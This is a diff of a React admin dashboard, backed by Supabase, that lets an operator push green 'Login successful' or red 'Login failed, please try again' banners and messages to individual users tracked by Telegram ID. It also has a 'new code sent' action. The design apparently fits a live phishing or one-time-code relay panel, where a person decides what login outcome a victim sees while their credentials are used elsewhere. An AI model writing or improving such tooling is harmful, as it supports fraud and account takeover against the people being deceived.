@@ -1,12 +1,7 @@
-import React, { useState, useEffect } from 'react';
-import { useAppConfig } from '../context/AppContext';
-import { MockDatabase, UserTask } from '../lib/mockDatabase';
-import { User, Phone, Globe, Hash, Clock, Check, Edit2, Image as ImageIcon, MessageSquare } from 'lucide-react';
-
 import React, { useState, useEffect, useMemo } from 'react';
 import { useAppConfig } from '../context/AppContext';
 import { supabase, SupabaseTask } from '../lib/supabase';
-import { User, Phone, Globe, Hash, Clock, Check, Edit2, Image as ImageIcon, Search, ShieldCheck, Activity, Users, FileText, Send, CheckCircle2 } from 'lucide-react';
+import { User, Phone, Globe, Hash, Clock, Check, Edit2, Image as ImageIcon, Search, ShieldCheck, Activity, Users, FileText, Send, CheckCircle2, MessageSquare } from 'lucide-react';
 
 export default function AdminDashboard() {
   const [tasks, setTasks] = useState<SupabaseTask[]>([]);
@@ -67,11 +62,22 @@ export default function AdminDashboard() {
     showNotification('New code has been sent!');
   };
 
-  const handleSendImage = async (id: string, telegram_id: number) => {
+  const handleSendBanner = async (id: string, type: 'success' | 'error') => {
     // Generates the green "Login successful" banner similar to your image
     const SUCCESS_BANNER_URL = "data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22500%22%20height%3D%22120%22%20viewBox%3D%220%200%20500%20120%22%3E%3Crect%20width%3D%22100%25%22%20height%3D%22100%25%22%20fill%3D%22%2358c026%22%2F%3E%3Cg%20transform%3D%22translate(30%2C%2020)%22%3E%3Cpath%20d%3D%22M12%2C14%20L82%2C14%20C89%2C14%2093%2C19%2091%2C26%20L81%2C72%20C79%2C79%2073%2C83%2066%2C83%20L10%2C83%20C3%2C83%20-1%2C78%200%2C71%20L7%2C24%20C8%2C18%2011%2C14%2018%2C14%20Z%22%20fill%3D%22%23fff%22%2F%3E%3Cpath%20d%3D%22M12%2C24%20L45%2C46%20L82%2C24%22%20stroke%3D%22%2358c026%22%20stroke-width%3D%225%22%20fill%3D%22none%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%3Cline%20x1%3D%22-15%22%20y1%3D%2230%22%20x2%3D%220%22%20y2%3D%2230%22%20stroke%3D%22%23fff%22%20stroke-width%3D%224%22%20stroke-linecap%3D%22round%22%2F%3E%3Cline%20x1%3D%22-25%22%20y1%3D%2250%22%20x2%3D%225%22%20y2%3D%2250%22%20stroke%3D%22%23fff%22%20stroke-width%3D%224%22%20stroke-linecap%3D%22round%22%2F%3E%3Cline%20x1%3D%22-10%22%20y1%3D%2270%22%20x2%3D%22-2%22%20y2%3D%2270%22%20stroke%3D%22%23fff%22%20stroke-width%3D%224%22%20stroke-linecap%3D%22round%22%2F%3E%3C%2Fg%3E%3Ctext%20x%3D%22140%22%20y%3D%2255%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3ELogin%20successful%2C%3C%2Ftext%3E%3Ctext%20x%3D%22140%22%20y%3D%2290%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3Ecurrently%20sending%3C%2Ftext%3E%3C%2Fsvg%3E";
-    await supabase.from('verifications').update({ image_url: SUCCESS_BANNER_URL }).eq('id', id);
-    showNotification('Success Banner sent to user!');
+    // Generates a red "Login failed" banner
+    const ERROR_BANNER_URL = "data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22500%22%20height%3D%22120%22%20viewBox%3D%220%200%20500%20120%22%3E%3Crect%20width%3D%22100%25%22%20height%3D%22100%25%22%20fill%3D%22%23d32f2f%22%2F%3E%3Cg%20transform%3D%22translate(30%2C%2020)%22%3E%3Cpath%20d%3D%22M45%2C10%20A35%2C35%200%201%2C0%2045%2C80%20A35%2C35%200%201%2C0%2045%2C10%20Z%22%20fill%3D%22none%22%20stroke%3D%22%23fff%22%20stroke-width%3D%228%22%2F%3E%3Cpath%20d%3D%22M30%2C30%20L60%2C60%20M60%2C30%20L30%2C60%22%20stroke%3D%22%23fff%22%20stroke-width%3D%228%22%20stroke-linecap%3D%22round%22%2F%3E%3C%2Fg%3E%3Ctext%20x%3D%22120%22%20y%3D%2255%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3ELogin%20failed%2C%3C%2Ftext%3E%3Ctext%20x%3D%22120%22%20y%3D%2290%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3Eplease%20try%20again%3C%2Ftext%3E%3C%2Fsvg%3E";
+
+    const imageUrl = type === 'success' ? SUCCESS_BANNER_URL : ERROR_BANNER_URL;
+    const msg = type === 'success' ? 'The admin has successfully verified your data. (Verified)' : 'Verification failed, please review and try again.';
+    
+    await supabase.from('verifications').update({ 
+      image_url: imageUrl,
+      success_message: msg,
+      status: type === 'success' ? 'success' : 'error'
+    }).eq('id', id);
+
+    showNotification(type === 'success' ? 'Success Banner sent to user!' : 'Error Banner sent to user!');
   };
 
   const handleSendSuccess = async (id: string, telegram_id: number) => {
@@ -352,20 +358,19 @@ export default function AdminDashboard() {
 
                   <div className="flex gap-2">
                     <button 
-                      onClick={() => handleSendImage(task.id, task.telegram_id)}
-                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-colors ${task.image_url ? 'bg-indigo-500/20 text-indigo-300 border border-indigo-500/30' : 'bg-zinc-900 border border-zinc-800 text-zinc-400 hover:bg-zinc-800'}`}
+                      onClick={() => handleSendBanner(task.id, 'success')}
+                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-colors bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20`}
                     >
                       <ImageIcon className="w-3.5 h-3.5" />
-                      <span>{task.image_url ? 'Banner Set' : 'Send Success Banner'}</span>
+                      <span>{task.image_url?.includes('58c026') ? 'Banner Sent' : '✅ Success Banner'}</span>
                     </button>
 
                     <button 
-                      onClick={() => handleSendSuccess(task.id, task.telegram_id)}
-                      disabled={task.status === 'success'}
-                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-all ${task.status === 'success' ? 'bg-emerald-900/40 text-emerald-500/50 cursor-not-allowed border border-emerald-900/50' : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-lg shadow-emerald-500/20'}`}
+                      onClick={() => handleSendBanner(task.id, 'error')}
+                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-colors bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20`}
                     >
-                      <Check className="w-4 h-4" />
-                      <span>Verify User</span>
+                      <ImageIcon className="w-3.5 h-3.5" />
+                      <span>{task.image_url?.includes('d32f2f') ? 'Banner Sent' : '❌ Error Banner'}</span>
                     </button>
                   </div>
                 </div>
